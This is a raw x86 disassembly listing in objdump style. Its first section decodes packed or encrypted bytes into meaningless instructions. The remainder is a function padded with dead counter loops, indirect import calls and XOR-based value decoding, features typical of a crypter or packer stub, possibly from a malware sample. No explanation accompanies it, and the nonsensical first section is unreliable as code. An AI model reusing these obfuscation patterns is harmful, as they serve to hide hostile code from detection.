  414b77:	mov    ebx,DWORD PTR [eax-0x462383b]
  414b7d:	pop    esp
  414b7e:	mov    BYTE PTR [ebx-0x295d3027],bh
  414b84:	xchg   esp,eax
  414b85:	jg     0x414b96
  414b87:	xchg   esp,eax
  414b88:	mov    dl,0xc1
  414b8a:	test   eax,0x88b04cc1
  414b8f:	add    DWORD PTR [esi+0x50d4ad49],ebx
  414b95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b96:	retf   0xd033
  414b99:	add    edx,ecx
  414b9b:	imul   edx,ebx
  414b9e:	cmp    edx,edi
  414ba0:	jmp    0x414e28
  414ba5:	int    0xc1
  414ba7:	cmp    al,0xca
  414ba9:	int3   
  414baa:	leave  
  414bab:	aad    0xd9
  414bad:	xchg   esp,eax
  414bae:	mov    ch,0x6d
  414bb0:	dec    edx
  414bb1:	xchg   ebx,eax
  414bb2:	cwde   
  414bb3:	inc    edx
  414bb4:	xor    DWORD PTR [eax-0x1a8780ee],eax
  414bba:	jle    0x414c34
  414bbc:	js     0x414b95
  414bbe:	xchg   DWORD PTR [ebx+eiz*1-0x2cbcdd60],esi
  414bc5:	sub    ah,BYTE PTR [edi+0xd05fc8e]
  414bcb:	in     eax,dx
  414bcc:	add    dh,BYTE PTR [edi-0x55b0ee49]
  414bd2:	mov    esi,0x104de3
  414bd7:	jmp    0xe283fcd8
  414bdc:	jne    0x414c1d
  414bde:	test   DWORD PTR [ebp-0xe5c1f5d],ecx
  414be4:	mov    ebx,0x909ae5ff
  414be9:	lock jnp 0x414c0c
  414bec:	jmp    0xafbded9e
  414bf1:	popa   
  414bf2:	in     eax,dx
  414bf3:	push   edi
  414bf4:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bf6:	hlt    
  414bf7:	dec    edi
  414bf8:	leave  
  414bf9:	adc    eax,0xa964deff
  414bfe:	ins    DWORD PTR es:[edi],dx
  414bff:	pop    ebp
  414c00:	loopne 0x414c2a
  414c02:	(bad)  
  414c03:	in     al,dx
  414c04:	add    ch,BYTE PTR [ecx]
  414c06:	mov    cs,WORD PTR [edi-0x5a]
  414c09:	loop   0x414c4c
  414c0b:	mov    ds:0xc1e6f6c0,eax
  414c10:	test   BYTE PTR [edx+0x5b7e2865],dl
  414c16:	mov    bl,0x57
  414c18:	retf   
  414c19:	xchg   esp,eax
  414c1a:	inc    ebp
  414c1b:	xor    eax,0x96b894f
  414c20:	ins    DWORD PTR es:[edi],dx
  414c21:	jg     0x414bba
  414c23:	pop    esp
  414c24:	dec    edi
  414c25:	jo     0x414c7b
  414c27:	sbb    edx,DWORD PTR [eax-0x77]
  414c2a:	iret   
  414c2b:	fdiv   DWORD PTR [ebx+0x64000538]
  414c31:	cdq    
  414c32:	mov    bl,0x6c
  414c34:	into   
  414c35:	cwde   
  414c36:	lods   eax,DWORD PTR ds:[esi]
  414c37:	sub    BYTE PTR [ecx-0x5c2c54d8],0xe
  414c3e:	cmp    ebx,DWORD PTR [ebp+0xa]
  414c41:	mov    edi,0xf6ba0524
  414c46:	mov    esp,0x3e557176
  414c4b:	and    ecx,DWORD PTR [ebx+0x7c2f4d58]
  414c51:	push   es
  414c52:	adc    edi,eax
  414c54:	mov    WORD PTR [esi],ss
  414c56:	fucomip st,st(3)
  414c58:	xor    DWORD PTR [eax+0x6d],esp
  414c5b:	and    eax,0x336e69da
  414c60:	jle    0x414cbf
  414c62:	iret   
  414c63:	mov    cl,0x70
  414c65:	mov    edx,0x482da510
  414c6a:	or     DWORD PTR [edi+0x65],0x53fbc0c6
  414c71:	ja     0x414c92
  414c73:	nop
  414c74:	push   esi
  414c75:	(bad)  
  414c76:	out    dx,al
  414c77:	push   edx
  414c78:	inc    ebp
  414c79:	ins    DWORD PTR es:[edi],dx
  414c7a:	adc    eax,0x997e9096
  414c7f:	sahf   
  414c80:	mov    WORD PTR [ebp+0x67c03454],es
  414c86:	mov    dh,0x89
  414c88:	xor    eax,0x89c54e93
  414c8d:	dec    ebx
  414c8e:	jns    0x414c23
  414c90:	pop    ebp
  414c91:	pop    edi
  414c92:	sbb    al,0x1b
  414c94:	jge    0x414cb3
  414c96:	and    DWORD PTR [eax],edi
  414c98:	cmp    ah,BYTE PTR [esi]
  414c9a:	jns    0x414caa
  414c9c:	lods   eax,DWORD PTR ds:[esi]
  414c9d:	inc    edx
  414c9e:	cld    
  414c9f:	or     eax,0x8c28d8ec
  414ca4:	and    al,0x3b
  414ca6:	mov    eax,ds:0xd7aa5826
  414cab:	dec    eax
  414cac:	xchg   ebp,eax
  414cad:	mov    bl,BYTE PTR ds:0x7c4325d6
  414cb3:	cdq    
  414cb4:	mov    edx,0xe2ade689
  414cb9:	push   ebp
  414cba:	adc    eax,0xdee7420b
  414cbf:	rol    BYTE PTR [esi],1
  414cc1:	mov    ebx,0x8ff3b58c
  414cc6:	cli    
  414cc7:	out    dx,eax
  414cc8:	pop    eax
  414cc9:	mov    ecx,0xcf785547
  414cce:	addr16 setns bl
  414cd2:	pop    es
  414cd3:	mov    bh,0x4f
  414cd5:	cwde   
  414cd6:	(bad)  
  414cd8:	mov    cl,0x55
  414cda:	jmp    0x414cf0
  414cdc:	sub    dl,BYTE PTR [ecx+0x2f875a62]
  414ce2:	ins    BYTE PTR es:[edi],dx
  414ce3:	jno    0x414ca6
  414ce5:	(bad)  
  414ce6:	adc    BYTE PTR [eax+ebx*8+0x3c],bl
  414cea:	cmp    edx,ebp
  414cec:	fdivr  st,st(5)
  414cee:	in     al,0x5d
  414cf0:	mov    ebp,0xda3b470a
  414cf5:	cli    
  414cf6:	mov    ah,0x94
  414cf8:	stc    
  414cf9:	adc    al,0xec
  414cfb:	adc    edi,ebx
  414cfd:	repz add al,0x81
  414d00:	mov    fs,WORD PTR [ebx+esi*8]
  414d03:	sub    DWORD PTR [eax],edi
  414d05:	mov    ebp,0xc74c747e
  414d0a:	ret    0x689a
  414d0d:	cmc    
  414d0e:	pop    edi
  414d0f:	mov    esp,0x7173db1d
  414d14:	out    dx,eax
  414d15:	mov    cl,0xd0
  414d17:	out    0x3c,eax
  414d19:	push   edi
  414d1a:	cmp    eax,0x8fdc2e9a
  414d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d20:	xchg   ecx,eax
  414d21:	mov    ah,BYTE PTR [ebx-0x3f]
  414d24:	ins    DWORD PTR es:[edi],dx
  414d25:	xchg   edx,eax
  414d26:	xor    eax,0x1bc64908
  414d2b:	mov    ?,WORD PTR [edx-0x743ebad0]
  414d31:	int    0x6e
  414d33:	push   0xb99b1d29
  414d38:	sbb    eax,0x98215b17
  414d3d:	fld    QWORD PTR [eax-0x34be9a85]
  414d43:	push   es
  414d44:	pop    es
  414d45:	mov    edi,DWORD PTR [ebx]
  414d47:	test   eax,0x1a7773ee
  414d4c:	jmp    0xe81c1cee
  414d51:	loopne 0x414d04
  414d53:	pop    edi
  414d54:	push   ebx
  414d55:	or     dl,dl
  414d57:	out    dx,al
  414d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d59:	aad    0xbd
  414d5b:	xor    DWORD PTR [eax+0x1],eax
  414d5e:	dec    esp
  414d5f:	mov    ecx,0x2babaf88
  414d64:	(bad)  
  414d65:	ins    DWORD PTR es:[edi],dx
  414d66:	jae    0x414d42
  414d68:	xchg   esp,eax
  414d69:	add    BYTE PTR [ecx-0x5c56e4a7],dl
  414d6f:	or     dl,BYTE PTR [esi]
  414d71:	jmp    DWORD PTR [ebx]
  414d73:	adc    ch,BYTE PTR [esi]
  414d75:	sub    DWORD PTR [ebx],0xffffffb6
  414d78:	dec    ebp
  414d79:	xchg   ecx,eax
  414d7a:	not    BYTE PTR [eiz*4+0x498b6a61]
  414d81:	inc    ecx
  414d82:	mov    dh,0x4c
  414d84:	pop    edi
  414d85:	jmp    0xe00a:0xb9829c7e
  414d8c:	mov    edx,DWORD PTR [edi+0x7c]
  414d8f:	js     0x414e0d
  414d91:	cdq    
  414d92:	js     0x414daa
  414d94:	sbb    eax,0xe63cb133
  414d99:	sbb    DWORD PTR [edx],edi
  414d9b:	mov    ebx,0xe82d651c
  414da0:	rcl    DWORD PTR [edx],cl
  414da2:	cli    
  414da3:	add    eax,0xd915ddb3
  414da8:	imul   ebp,eax,0x2c
  414dab:	lods   eax,DWORD PTR ds:[esi]
  414dac:	sub    edi,DWORD PTR ds:0x739cae47
  414db2:	add    esp,0xcb19baa6
  414db8:	out    dx,eax
  414db9:	xchg   esp,eax
  414dba:	adc    edi,ebx
  414dbc:	pop    ebp
  414dbd:	add    eax,0xc5e70151
  414dc2:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  414dc4:	pop    eax
  414dc5:	dec    ebp
  414dc6:	bound  ecx,QWORD PTR [edi+0x6ce13f28]
  414dcc:	pop    ds
  414dcd:	mov    edx,DWORD PTR [esi-0x26914e35]
  414dd3:	fld    DWORD PTR [esi]
  414dd5:	adc    BYTE PTR [edx+0xb],0x37
  414dd9:	adc    eax,0x5cf83f01
  414dde:	mov    dl,BYTE PTR [eax+eax*8]
  414de1:	ja     0x414d6a
  414de3:	test   al,0x59
  414de5:	jmp    0x414df1
  414de7:	fsubr  DWORD PTR [esi]
  414de9:	pop    ecx
  414dea:	mov    ?,WORD PTR ds:0xbc8595bd
  414df0:	mov    esi,0xeb9bbf02
  414df5:	mov    al,ds:0x6dc85626
  414dfa:	fsub   DWORD PTR ds:0x7b676fad
  414e00:	std    
  414e01:	aam    0x80
  414e03:	mov    bl,0xb0
  414e05:	test   DWORD PTR [esi],ebp
  414e07:	ds pop ss
  414e09:	outs   dx,BYTE PTR ds:[esi]
  414e0a:	or     bl,BYTE PTR [esi+0x4]
  414e0d:	inc    esp
  414e0e:	xor    BYTE PTR [esi-0x7b99676c],0x70
  414e15:	shr    DWORD PTR [eax],cl
  414e17:	call   0x208204ba
  414e1c:	repz js 0x414dae
  414e1f:	pop    ds
  414e20:	sub    BYTE PTR [eax-0x6d0fb2bf],dl
  414e26:	pop    ss
  414e27:	or     DWORD PTR [edi],0xffac6686
  414e2d:	call   FWORD PTR [ebx+0x5f]
  414e30:	leave  
  414e31:	ret    0x8
  414e34:	push   ebp
  414e35:	mov    ebp,esp
  414e37:	sub    esp,0xa8
  414e3d:	movzx  eax,WORD PTR ds:0x42a7f5
  414e44:	xor    DWORD PTR ds:0x42a771,eax
  414e4a:	push   ebx
  414e4b:	and    DWORD PTR ds:0x42a7b9,0x2f2e
  414e55:	push   esi
  414e56:	and    DWORD PTR ds:0x42a841,0x0
  414e60:	jmp    0x414e70
  414e65:	mov    eax,ds:0x42a841
  414e6a:	inc    eax
  414e6b:	mov    ds:0x42a841,eax
  414e70:	cmp    DWORD PTR ds:0x42a841,0x10
  414e77:	jae    0x414ea3
  414e7d:	cmp    DWORD PTR ds:0x42a841,0x12
  414e84:	jne    0x414e9e
  414e8a:	push   DWORD PTR [ebp-0x1c]
  414e8d:	push   DWORD PTR [ebp-0x10]
  414e90:	push   DWORD PTR [ebp-0x10]
  414e93:	push   0x5267
  414e98:	call   DWORD PTR ds:0x41d260
  414e9e:	jmp    0x414e65
  414ea3:	push   edi
  414ea4:	xor    esi,esi
  414ea6:	add    ecx,DWORD PTR ds:0x42a84d
  414eac:	push   0x0
  414eae:	push   0x19
  414eb0:	xor    ecx,eax
  414eb2:	pop    ecx
  414eb3:	or     eax,0x2a9a
  414eb8:	xor    edx,edx
  414eba:	sub    eax,DWORD PTR ds:0x42a801
  414ec0:	mov    eax,esi
  414ec2:	div    ecx
  414ec4:	push   edx
  414ec5:	sbb    DWORD PTR ds:0x42a7f9,0x42a831
  414ecf:	call   DWORD PTR ds:0x41d400
  414ed5:	mov    DWORD PTR ds:0x42a801,0x6c20
  414edf:	inc    esi
  414ee0:	mov    DWORD PTR ds:0x42a835,0x23c0
  414eea:	cmp    esi,0x1000
  414ef0:	jb     0x414ea6
  414ef6:	mov    DWORD PTR [ebp-0x24],0xf89c8538
  414efd:	inc    DWORD PTR ds:0x42a775
  414f03:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  414f0a:	lea    eax,[ebp-0x2c]
  414f0d:	inc    ecx
  414f0e:	mov    DWORD PTR [ebp-0x18],eax
  414f11:	and    DWORD PTR ds:0x42a845,0x42a765
  414f1b:	lea    eax,[ebp-0x30]
  414f1e:	xor    DWORD PTR ds:0x42a7b1,0x42a841
  414f28:	mov    DWORD PTR [ebp-0x14],eax
  414f2b:	or     DWORD PTR ds:0x42a801,edi
  414f31:	mov    eax,ds:0x41eae6
  414f36:	add    DWORD PTR ds:0x42a769,ebx
  414f3c:	mov    eax,DWORD PTR [eax+0x1c8]
  414f42:	mov    eax,DWORD PTR [eax]
  414f44:	and    DWORD PTR ds:0x42a7fd,0x0
  414f4e:	jmp    0x414f60
  414f53:	mov    edi,DWORD PTR ds:0x42a7fd
  414f59:	inc    edi
  414f5a:	mov    DWORD PTR ds:0x42a7fd,edi
  414f60:	cmp    DWORD PTR ds:0x42a7fd,0x11
  414f67:	jae    0x414fb6
  414f6d:	cmp    DWORD PTR ds:0x42a7fd,0x4
  414f74:	jne    0x414f8d
  414f7a:	push   0x73af
  414f7f:	push   0x42a809
  414f84:	push   DWORD PTR [ebp-0x18]
  414f87:	call   DWORD PTR ds:0x41d264
  414f8d:	cmp    DWORD PTR ds:0x42a7fd,0x3
  414f94:	jne    0x414fa7
  414f9a:	mov    edi,DWORD PTR ds:0x42a7fd
  414fa0:	inc    edi
  414fa1:	mov    DWORD PTR ds:0x42a7fd,edi
  414fa7:	jmp    0x414f53
  414fac:	mov    DWORD PTR ds:0x42a7b5,0x500e
  414fb6:	mov    ecx,DWORD PTR [ebp-0x14]
  414fb9:	and    DWORD PTR ds:0x42a7c9,0x1370
  414fc3:	mov    esi,0x7510850
  414fc8:	xor    ebx,DWORD PTR ds:0x42a76d
  414fce:	xor    eax,esi
  414fd0:	xor    edi,edi
  414fd2:	mov    edi,0x327298
  414fd7:	sub    DWORD PTR ds:0x42a845,ebx
  414fdd:	add    eax,edi
  414fdf:	mov    DWORD PTR [ecx],eax
  414fe1:	mov    DWORD PTR ds:0x42a849,edi
  414fe7:	mov    eax,ds:0x41ed1a
  414fec:	movzx  ebx,BYTE PTR ds:0x42a7b9
  414ff3:	cmp    eax,0x22c02f45
  414ff8:	mov    eax,DWORD PTR [ebp-0x4]
  414ffb:	mov    DWORD PTR ds:0x42a805,edi
  415001:	mov    ebx,0xf89c853c
  415006:	mov    DWORD PTR ds:0x42a845,0x1488
  415010:	je     0x4150a4
  415016:	and    DWORD PTR ds:0x42a849,0x0
  415020:	jmp    0x415032
  415025:	mov    ecx,DWORD PTR ds:0x42a849
  41502b:	inc    ecx
  41502c:	mov    DWORD PTR ds:0x42a849,ecx
  415032:	cmp    DWORD PTR ds:0x42a849,0x13
  415039:	jae    0x41506a
  41503f:	cmp    DWORD PTR ds:0x42a849,0x15
  415046:	jne    0x41505f
  41504c:	push   DWORD PTR [ebp-0xc]
  41504f:	push   0x7b08
  415054:	push   0x10eb
  415059:	call   DWORD PTR ds:0x41d268
  41505f:	jmp    0x415025
  415064:	or     ecx,DWORD PTR ds:0x42a871
  41506a:	mov    ecx,DWORD PTR [ebp-0x24]
  41506d:	xor    eax,esi
  41506f:	xor    DWORD PTR ds:0x42a7f1,0x57fa
  415079:	add    eax,edi
  41507b:	add    DWORD PTR ds:0x42a885,0x42a7b5
  415085:	imul   eax,ecx
  415088:	mov    DWORD PTR ds:0x42a7c1,0x7c29
  415092:	mov    DWORD PTR [ebp-0x24],eax
  415095:	mov    DWORD PTR ds:0x42a7c5,0x1f8
  41509f:	jmp    0x4152c1
  4150a4:	and    DWORD PTR ds:0x42a879,0x0
  4150ae:	mov    ecx,DWORD PTR ds:0x42a879
  4150b4:	inc    ecx
  4150b5:	mov    DWORD PTR ds:0x42a879,ecx
  4150bb:	cmp    DWORD PTR ds:0x42a879,0x2a
  4150c2:	jne    0x4150d1
  4150c8:	push   DWORD PTR [ebp-0x24]
  4150cb:	call   DWORD PTR ds:0x41d26c
  4150d1:	cmp    DWORD PTR ds:0x42a879,0x1c
  4150d8:	jb     0x4150ae
  4150de:	movzx  ecx,BYTE PTR ds:0x42a83d
  4150e5:	xor    ecx,DWORD PTR ds:0x42a84d
  4150eb:	mov    DWORD PTR ds:0x42a83d,ecx
  4150f1:	xor    eax,esi
  4150f3:	add    eax,edi
  4150f5:	and    DWORD PTR ds:0x42a7b1,edi
  4150fb:	mov    ds:0x41ebfa,eax
  415100:	neg    DWORD PTR ds:0x42a7f1
  415106:	mov    eax,DWORD PTR [ebp-0x24]
  415109:	and    DWORD PTR ds:0x42a875,0x0
  415113:	mov    ecx,DWORD PTR ds:0x42a875
  415119:	inc    ecx
  41511a:	mov    DWORD PTR ds:0x42a875,ecx
  415120:	cmp    DWORD PTR ds:0x42a875,0x29
  415127:	jne    0x415138
  41512d:	push   0x548b
  415132:	call   DWORD PTR ds:0x41d0e4
  415138:	cmp    DWORD PTR ds:0x42a875,0x1c
  41513f:	jb     0x415113
  415145:	and    DWORD PTR ds:0x42a75d,0x0
  41514f:	xor    ecx,ecx
  415151:	add    ecx,DWORD PTR ds:0x42a75d
  415157:	inc    ecx
  415158:	mov    DWORD PTR ds:0x42a75d,ecx
  41515e:	cmp    DWORD PTR ds:0x42a75d,0xe
  415165:	jne    0x415176
  41516b:	push   0x42a99f
  415170:	call   DWORD PTR ds:0x41d0e8
  415176:	cmp    DWORD PTR ds:0x42a75d,0xd
  41517d:	jne    0x415190
  415183:	mov    ecx,DWORD PTR ds:0x42a75d
  415189:	inc    ecx
  41518a:	mov    DWORD PTR ds:0x42a75d,ecx
  415190:	cmp    DWORD PTR ds:0x42a75d,0x17
  415197:	jb     0x41514f
  41519d:	or     ecx,DWORD PTR ds:0x42a781
  4151a3:	xor    eax,esi
  4151a5:	and    DWORD PTR ds:0x42a7c1,0x0
  4151af:	jmp    0x4151c1
  4151b4:	mov    ecx,DWORD PTR ds:0x42a7c1
  4151ba:	inc    ecx
  4151bb:	mov    DWORD PTR ds:0x42a7c1,ecx
  4151c1:	cmp    DWORD PTR ds:0x42a7c1,0x11
  4151c8:	jae    0x415217
  4151ce:	cmp    DWORD PTR ds:0x42a7c1,0x9
  4151d5:	jne    0x4151f4
  4151db:	push   0x577c
  4151e0:	push   DWORD PTR [ebp-0x18]
  4151e3:	push   0x838a
  4151e8:	push   DWORD PTR [ebp-0x10]
  4151eb:	push   DWORD PTR [ebp-0x28]
  4151ee:	call   DWORD PTR ds:0x41d0ec
  4151f4:	cmp    DWORD PTR ds:0x42a7c1,0x8
  4151fb:	jne    0x415210
  415201:	xor    ecx,ecx
  415203:	xor    ecx,DWORD PTR ds:0x42a7c1
  415209:	inc    ecx
  41520a:	mov    DWORD PTR ds:0x42a7c1,ecx
  415210:	jmp    0x4151b4
  415215:	not    ecx
  415217:	add    eax,edi
  415219:	and    DWORD PTR ds:0x42a7c9,0x0
  415223:	mov    ecx,DWORD PTR ds:0x42a7c9
  415229:	inc    ecx
  41522a:	mov    DWORD PTR ds:0x42a7c9,ecx
  415230:	cmp    DWORD PTR ds:0x42a7c9,0x26
  415237:	jne    0x41524b
  41523d:	push   DWORD PTR [ebp-0x20]
  415240:	push   0x2236
  415245:	call   DWORD PTR ds:0x41d270
  41524b:	cmp    DWORD PTR ds:0x42a7c9,0x16
  415252:	jb     0x415223
  415258:	mov    ds:0x41ed1a,eax
  41525d:	add    ecx,DWORD PTR ds:0x42a775
  415263:	mov    eax,DWORD PTR [ebp-0x4]
  415266:	mov    ecx,DWORD PTR ds:0x41ebfa
  41526c:	xor    eax,esi
  41526e:	xor    DWORD PTR ds:0x42a7c9,0x42a881
  415278:	add    eax,edi
  41527a:	mov    DWORD PTR ds:0x42a871,0x2781
  415284:	cmp    ecx,eax
  415286:	mov    DWORD PTR ds:0x42a841,0x2b32
  415290:	jne    0x4152c1
  415296:	mov    DWORD PTR ds:0x42a839,0x7717
  4152a0:	push   ebx
  4152a1:	sub    DWORD PTR ds:0x42a765,0x42a87d
  4152ab:	push   DWORD PTR [ebp-0x4]
  4152ae:	push   DWORD PTR [ebp-0x24]
  4152b1:	sub    DWORD PTR ds:0x42a83d,0x42a759
  4152bb:	call   DWORD PTR ds:0x41ebf2
  4152c1:	mov    eax,ds:0x41eae6
  4152c6:	mov    eax,DWORD PTR [eax+0x18c]
  4152cc:	mov    eax,DWORD PTR [eax]
  4152ce:	mov    DWORD PTR [ebp-0x44],eax
  4152d1:	mov    DWORD PTR [ebp-0x10],ebx
  4152d4:	and    DWORD PTR ds:0x42a7cd,0x0
  4152de:	jmp    0x4152f0
  4152e3:	mov    ecx,DWORD PTR ds:0x42a7cd
  4152e9:	inc    ecx
  4152ea:	mov    DWORD PTR ds:0x42a7cd,ecx
  4152f0:	cmp    DWORD PTR ds:0x42a7cd,0x1a
  4152f7:	jae    0x4153d6
  4152fd:	cmp    DWORD PTR ds:0x42a7cd,0x24
  415304:	jne    0x41531a
  41530a:	push   0x42a849
  41530f:	push   0x28eb
  415314:	call   DWORD PTR ds:0x41d0f0
  41531a:	jmp    0x4152e3
  41531f:	mov    DWORD PTR ds:0x42a781,0x10
  415329:	cmp    DWORD PTR ds:0x42a781,0x0
  415330:	je     0x4153d6
  415336:	cmp    DWORD PTR ds:0x42a781,0x7
  41533d:	jne    0x415351
  415343:	push   0x572d
  415348:	push   DWORD PTR [ebp-0xc]
  41534b:	call   DWORD PTR ds:0x41d0f4
  415351:	cmp    DWORD PTR ds:0x42a781,0x8
  415358:	jne    0x41536d
  41535e:	xor    edx,edx
  415360:	add    edx,DWORD PTR ds:0x42a781
  415366:	dec    edx
  415367:	mov    DWORD PTR ds:0x42a781,edx
  41536d:	mov    edx,DWORD PTR ds:0x42a781
  415373:	dec    edx
  415374:	mov    DWORD PTR ds:0x42a781,edx
  41537a:	jmp    0x415329
  41537f:	and    DWORD PTR ds:0x42a7f1,0x0
  415389:	jmp    0x415399
  41538e:	mov    eax,ds:0x42a7f1
  415393:	inc    eax
  415394:	mov    ds:0x42a7f1,eax
  415399:	cmp    DWORD PTR ds:0x42a7f1,0x13
  4153a0:	jae    0x4153d6
  4153a6:	cmp    DWORD PTR ds:0x42a7f1,0x1b
  4153ad:	jne    0x4153cb
  4153b3:	push   0x3cd6
  4153b8:	push   0x42a759
  4153bd:	push   DWORD PTR [ebp-0x1c]
  4153c0:	push   0x865d
  4153c5:	call   DWORD PTR ds:0x41d0f8
  4153cb:	jmp    0x41538e
  4153d0:	or     DWORD PTR ds:0x42a7bd,ecx
  4153d6:	mov    DWORD PTR [ebp-0x10],ebx
  4153d9:	mov    DWORD PTR [ebp-0x10],ebx
  4153dc:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  4153e3:	and    DWORD PTR ds:0x42a831,0x0
  4153ed:	mov    eax,ds:0x42a831
  4153f2:	inc    eax
  4153f3:	mov    ds:0x42a831,eax
  4153f8:	cmp    DWORD PTR ds:0x42a831,0xc
  4153ff:	jne    0x415416
  415405:	push   DWORD PTR [ebp-0x24]
  415408:	push   DWORD PTR [ebp-0x24]
  41540b:	push   0x42a932
  415410:	call   DWORD PTR ds:0x41d0fc
  415416:	cmp    DWORD PTR ds:0x42a831,0xb
  41541d:	jne    0x415431
  415423:	xor    eax,eax
  415425:	xor    eax,DWORD PTR ds:0x42a831
  41542b:	inc    eax
  41542c:	mov    ds:0x42a831,eax
  415431:	cmp    DWORD PTR ds:0x42a831,0x17
  415438:	jb     0x4153ed
  41543e:	adc    DWORD PTR ds:0x42a761,ecx
  415444:	mov    DWORD PTR [ebp-0x10],ebx
  415447:	mov    DWORD PTR [ebp-0x10],0xf89c8520
  41544e:	and    ecx,eax
  415450:	mov    eax,DWORD PTR [ebp-0x24]
  415453:	mov    DWORD PTR ds:0x42a88d,0x1d
  41545d:	cmp    DWORD PTR ds:0x42a88d,0x0
  415464:	je     0x4154d3
  41546a:	cmp    DWORD PTR ds:0x42a88d,0xe
  415471:	jne    0x415495
  415477:	push   DWORD PTR [ebp-0x1c]
  41547a:	push   0x42a769
  41547f:	push   DWORD PTR [ebp-0x14]
  415482:	push   0x4571
  415487:	push   0x5504
  41548c:	push   DWORD PTR [ebp-0x24]
  41548f:	call   DWORD PTR ds:0x41d100
  415495:	cmp    DWORD PTR ds:0x42a88d,0xf
  41549c:	jne    0x4154af
  4154a2:	mov    edx,DWORD PTR ds:0x42a88d
  4154a8:	dec    edx
  4154a9:	mov    DWORD PTR ds:0x42a88d,edx
  4154af:	mov    edx,DWORD PTR ds:0x42a88d
  4154b5:	dec    edx
  4154b6:	mov    DWORD PTR ds:0x42a88d,edx
  4154bc:	jmp    0x41545d
  4154c1:	mov    edx,DWORD PTR ds:0x42a7b9
  4154c7:	and    edx,DWORD PTR ds:0x42a84d
  4154cd:	mov    DWORD PTR ds:0x42a7b9,edx
  4154d3:	mov    ecx,DWORD PTR [ebp-0x4]
  4154d6:	and    DWORD PTR ds:0x42a781,0x65ac
  4154e0:	mov    edx,DWORD PTR [ebp-0x4]
  4154e3:	add    DWORD PTR ds:0x42a835,0x42a7f1
  4154ed:	xor    edx,esi
  4154ef:	xor    DWORD PTR ds:0x42a835,0x571
  4154f9:	xor    ecx,esi
  4154fb:	add    ecx,edx
  4154fd:	mov    edx,DWORD PTR [ebp-0x4]
  415500:	xor    eax,esi
  415502:	or     DWORD PTR ds:0x42a7c5,0x42a805
  41550c:	xor    edx,esi
  41550e:	add    eax,edi
  415510:	lea    ecx,[ecx+edx*1+0x9757c8]
  415517:	mov    DWORD PTR ds:0x42a7f5,0x1d99
  415521:	mov    DWORD PTR [ebp-0x20],eax
  415524:	mov    DWORD PTR ds:0x42a761,0x9d6
  41552e:	cmp    eax,ecx
  415530:	ja     0x415630
  415536:	jmp    0x415589
  41553b:	and    DWORD PTR ds:0x42a7bd,0x0
  415545:	mov    ecx,DWORD PTR ds:0x42a7bd
  41554b:	inc    ecx
  41554c:	mov    DWORD PTR ds:0x42a7bd,ecx
  415552:	cmp    DWORD PTR ds:0x42a7bd,0x21
  415559:	jne    0x415577
  41555f:	push   DWORD PTR [ebp-0x14]
  415562:	push   0x42a845
  415567:	push   0x6e14
  41556c:	push   0x8733
  415571:	call   DWORD PTR ds:0x41d104
  415577:	cmp    DWORD PTR ds:0x42a7bd,0x12
  41557e:	jb     0x415545
  415584:	sbb    eax,ecx
  415586:	mov    eax,DWORD PTR [ebp-0x20]
  415589:	and    DWORD PTR ds:0x42a87d,0x0
  415593:	jmp    0x4155a7
  415598:	xor    ecx,ecx
  41559a:	add    ecx,DWORD PTR ds:0x42a87d
  4155a0:	inc    ecx
  4155a1:	mov    DWORD PTR ds:0x42a87d,ecx
  4155a7:	cmp    DWORD PTR ds:0x42a87d,0x1c
  4155ae:	jae    0x4155d4
  4155b4:	cmp    DWORD PTR ds:0x42a87d,0x21
  4155bb:	jne    0x4155cf
  4155c1:	push   0x6aa9
  4155c6:	push   DWORD PTR [ebp-0x24]
  4155c9:	call   DWORD PTR ds:0x41d108
  4155cf:	jmp    0x415598
  4155d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4155d7:	xor    ecx,esi
  4155d9:	lea    eax,[ecx+eax*1+0x327298]
  4155e0:	push   eax
  4155e1:	mov    eax,DWORD PTR [ebp-0x14]
  4155e4:	xor    eax,esi
  4155e6:	lea    eax,[ebp+eax*1+0x3272a0]
  4155ed:	push   eax
  4155ee:	mov    eax,ds:0x41eae6
  4155f3:	push   DWORD PTR [eax+0x1bc]
  4155f9:	call   0x4043a1
  4155fe:	mov    eax,DWORD PTR [ebp-0x4]
  415601:	mov    ecx,DWORD PTR [ebp-0x20]
  415604:	xor    eax,esi
  415606:	lea    eax,[ecx+eax*1+0x327298]
  41560d:	mov    ecx,DWORD PTR [ebp-0x4]
  415610:	mov    edx,DWORD PTR [ebp-0x4]
  415613:	xor    edx,esi
  415615:	xor    ecx,esi
  415617:	add    ecx,edx
  415619:	mov    edx,DWORD PTR [ebp-0x4]
  41561c:	xor    edx,esi
  41561e:	lea    ecx,[ecx+edx*1+0x9757c8]
  415625:	mov    DWORD PTR [ebp-0x20],eax
  415628:	cmp    eax,ecx
  41562a:	jbe    0x41553b
  415630:	mov    eax,DWORD PTR [ebp+0xc]
  415633:	mov    ds:0x41e96a,eax
  415638:	mov    eax,DWORD PTR [ebp+0x10]
  41563b:	mov    ds:0x41ebbe,eax
  415640:	mov    eax,ds:0x41e96a
  415645:	mov    ecx,DWORD PTR [ebp-0x18]
  415648:	push   DWORD PTR [ebp-0x44]
  41564b:	sub    eax,edi
  41564d:	push   DWORD PTR [ebp-0x30]
  415650:	xor    eax,esi
  415652:	mov    DWORD PTR [ecx],eax
  415654:	push   DWORD PTR [ebp-0x2c]
  415657:	call   0x41594a
  41565c:	sub    eax,edi
  41565e:	xor    eax,esi
  415660:	mov    DWORD PTR [ebp+0xc],eax
  415663:	mov    ecx,DWORD PTR [ebp-0x4]
  415666:	mov    eax,DWORD PTR [ebp+0xc]
  415669:	xor    ecx,esi
  41566b:	add    ecx,edi
  41566d:	xor    edx,edx
  41566f:	div    ecx
  415671:	mov    ecx,DWORD PTR [ebp-0x24]
  415674:	cmp    ecx,eax
  415676:	jne    0x41589f
  41567c:	mov    eax,ds:0x41eae6
  415681:	mov    DWORD PTR [ebp+0x10],eax
  415684:	mov    eax,ds:0x41ebf6
  415689:	mov    DWORD PTR [ebp-0x50],eax
  41568c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  415693:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  41569a:	mov    DWORD PTR [ebp-0x4c],0xf89cb538
  4156a1:	mov    DWORD PTR [ebp-0x64],0xf89f0538
